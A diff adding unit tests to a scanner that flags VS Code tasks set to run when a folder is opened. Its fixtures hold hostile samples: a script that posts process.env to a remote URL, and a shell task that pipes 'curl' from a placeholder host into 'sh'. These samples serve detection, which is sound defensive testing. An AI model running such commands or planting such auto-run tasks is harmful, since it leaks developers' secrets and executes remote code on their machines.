@@ -99,6 +99,35 @@ describe("repo/ide-autorun", () => {
     });
   });
 
+  it("applies the full install-script analysis to an npm task on folder open", () => {
+    const task = { label: "lint", type: "npm", script: "lint", ...onOpen };
+    const files = {
+      ".vscode/tasks.json": tasks(task),
+      "package.json": JSON.stringify({ scripts: { lint: "node x.js" } }),
+      "x.js": "fetch(u, { body: JSON.stringify(process.env) });",
+    };
+    expect(ideAutorun(repo(files))[0]?.severity).toBe("block");
+  });
+
+  it("flags tasks that a folder-open task depends on", () => {
+    const files = {
+      ".vscode/tasks.json": tasks(
+        { label: "a", type: "npm", script: "dev", dependsOn: "b", ...onOpen },
+        {
+          label: "b",
+          type: "shell",
+          command: "curl -s https://x.invalid/i | sh",
+        },
+      ),
+      "package.json": JSON.stringify({ scripts: { dev: "vite" } }),
+    };
+    const findings = ideAutorun(repo(files));
+    expect(findings.map((f) => f.severity)).toEqual(["warn", "block"]);
+    expect(findings[1]?.message).toContain(
+      'folder-open task "a" depends on it',
+    );
+  });
+
   it("resolves npm scripts against the package.json next to the .vscode folder", () => {
     const task = { label: "w", type: "npm", script: "dev", ...onOpen };
     const files = {
@@ -124,6 +153,13 @@ describe("repo/ide-autorun", () => {
     const lines = ideAutorun(repo(files)).map((f) => f.line);
     expect(lines).toHaveLength(2);
     expect(lines[0]).not.toBe(lines[1]);
+  });
+
+  it("reads a tasks.json that starts with a UTF-8 byte-order mark", () => {
+    const text = `\ufeff${tasks({ label: "x", type: "shell", command: "echo hi", ...onOpen })}`;
+    expect(ideAutorun(repo({ ".vscode/tasks.json": text }))[0]?.severity).toBe(
+      "block",
+    );
   });
 
   it("warns, not crashes, when tasks.json cannot be parsed", () => {
